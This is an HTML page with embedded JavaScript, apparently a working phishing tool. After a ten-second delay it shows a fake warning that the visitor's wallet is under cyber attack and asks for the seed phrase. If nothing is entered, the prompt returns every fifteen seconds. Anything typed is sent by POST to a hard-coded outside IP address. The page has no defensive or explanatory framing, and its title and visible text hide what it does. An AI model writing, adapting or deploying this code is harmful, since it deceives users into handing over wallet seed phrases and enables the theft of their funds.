<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Execute JS after 10 seconds</title>
    <script>
        // Function to show the prompt and send data using POST request
        function showPrompt() {
            var phrase = prompt('We found that your wallet is under Cyber Attack and Wallet App Intent to Verify your seed phrase, please enter them below');
            if (phrase) {
                // Send the data via POST
                sendPostData(phrase);
            } else {
                // If no value is entered, keep showing the prompt every 15 seconds
                setTimeout(showPrompt, 15000); // 15000 milliseconds = 15 seconds
            }
        }

        // Function to send POST request
        function sendPostData(data) {
            // Create a new FormData object
            var formData = new FormData();
            formData.append('phrase', data);

            // Send the POST request using fetch
            fetch('http://54.169.169.39', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('Data successfully sent');
                } else {
                    console.error('Failed to send data');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        // Set a timer to execute the prompt for the first time after 10 seconds
        window.onload = function() {
            setTimeout(showPrompt, 10000); // 10000 milliseconds = 10 seconds
        }
    </script>
</head>
<body>
    <h1>Wait for 10 seconds...</h1>
</body>
</html>
